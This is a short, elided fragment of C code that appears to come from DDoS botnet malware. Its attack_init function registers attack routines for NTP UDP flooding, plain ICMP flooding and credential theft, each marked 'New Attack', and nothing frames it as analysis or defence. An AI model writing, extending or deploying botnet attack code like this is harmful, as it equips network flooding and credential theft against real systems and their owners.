...
BOOL attack_init(void)
{
    ...
    add_attack(ATK_VEC_NTP, (ATTACK_FUNC)attack_udp_ntp); // New Attack
    ...
    add_attack(ATK_VEC_ICMP, (ATTACK_FUNC)attack_icmp_plain); // New Attack

    add_attack(ATK_VEC_ICMP, (ATTACK_FUNC)attack_cred_theft); // New Attack
